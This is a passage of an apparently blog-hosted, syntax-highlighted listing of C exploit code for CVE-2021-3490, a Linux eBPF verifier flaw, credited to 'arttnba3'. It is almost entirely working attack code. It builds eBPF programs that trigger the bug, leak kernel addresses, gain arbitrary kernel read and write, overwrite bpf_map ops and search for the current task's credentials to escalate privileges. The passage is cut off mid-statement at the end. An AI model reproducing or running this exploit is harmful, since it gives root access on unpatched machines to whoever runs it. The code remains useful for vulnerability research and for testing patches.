class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_tools.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_OPS   0xffffffff822363e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK       0xffffffff82e1b400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED       0xffffffff82e88f20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SIZE 0x2000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG    BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> current_task, current_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> next_task - <span class="hljs-number">0x818</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">size_t</span> map_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_OPS(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-type">size_t</span> map_ops_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_ops_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        LEAK_MAP_OPS(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_MAP_DATA(__map_fd, __off)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-comment">/* for debug only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_map_data</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> map_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x110</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>            TRIGGER_VULN(map_fd),<br>            MAKE_VULN_REG(map_fd),<br>            READ_MAP_DATA(map_fd, (<span class="hljs-number">0x110</span> - <span class="hljs-number">0x8</span> * i)), <br>            BPF_EXIT_INSN()<br>        &#125;;<br><br>        <span class="hljs-keyword">if</span> (run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to run bpf prog!&quot;</span>);<br>        &#125;<br><br>        key = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to look up the map!&quot;</span>);<br>        &#125;<br>        map_data[i] = value[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x200</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, map_data[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> map_fd;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> log_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, MAP_SIZE, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map.ops ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_ops_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    map_ops_addr = value[<span class="hljs-number">0</span>];<br>    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;<br>    kernel_base += kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel_offset: 